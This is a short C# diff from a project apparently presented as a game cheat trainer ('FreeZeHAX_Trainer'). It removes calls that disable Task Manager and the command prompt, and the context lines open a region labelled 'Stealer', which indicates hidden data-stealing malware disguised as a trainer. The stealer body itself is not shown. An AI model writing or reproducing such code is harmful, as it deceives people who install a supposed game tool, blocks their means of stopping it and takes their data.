@@ -66,10 +66,6 @@ namespace FreeZeHAX_Trainer
         {
             Show();
             StartForm();
-            others.DisableTaskManager();
-            others.DisableCommandPrompt();
-            others.Wait(1000);
-
             #region Stealer
             try
             {
